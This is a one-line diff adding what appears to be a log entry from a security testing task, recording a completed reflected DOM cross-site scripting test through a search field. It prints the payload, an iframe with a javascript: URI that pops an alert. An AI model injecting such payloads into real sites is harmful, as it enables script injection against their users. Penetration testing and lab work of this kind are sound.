@@ -1,0 +1,2 @@
+[+] Completed Task 061726: Reflected DOM XSS via Search Field Payload: <iframe src="javascript:alert('XSS')">
+
